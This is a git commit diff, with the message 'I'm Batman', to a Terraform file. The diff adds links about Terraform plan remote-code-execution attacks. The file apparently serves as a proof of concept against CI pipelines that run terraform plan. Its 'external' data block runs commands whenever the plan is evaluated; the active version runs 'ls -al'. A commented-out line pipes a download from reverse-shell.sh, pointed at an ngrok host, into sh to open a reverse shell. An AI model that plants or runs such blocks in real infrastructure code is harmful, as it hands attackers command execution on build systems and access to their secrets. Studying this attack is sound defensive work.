89d0a8a6215e11cb8b58e6af86f97dacd7105b18
rcoliveira_cf <rcoliveira@cloudflare.com>
2024-12-11 21:51:51 +0000

    I'm Batman

--- modules/main.tf
+++ modules/main.tf
@@ -1,3 +1,9 @@
+# https://github.com/technologik/terraform_attack_automation/blob/main/PR_attack.py#L80C48-L80C55
+# https://github.com/technologik/terraform_attack_automation/blob/main/templates/exec_command.tf
+# https://alex.kaskaso.li/post/terraform-plan-rce
+# https://www.tenable.com/blog/the-dark-side-of-domain-specific-languages-uncovering-new-attack-techniques-in-opa-and?cf_target_id=8DEE8756E320787BE367AEC58ADA4CD3
+# https://cloud.hacktricks.xyz/pentesting-ci-cd/terraform-security#rce-in-terraform
+
 data "external" "local_exec" {
   # program = ["sh", "-c", "curl https://reverse-shell.sh/4.tcp.ngrok.io:15925 | sh"]
   program = ["python3", "-c", "import json; import subprocess; print(json.dumps({'output': str(subprocess.getoutput('ls -al'))}))"]
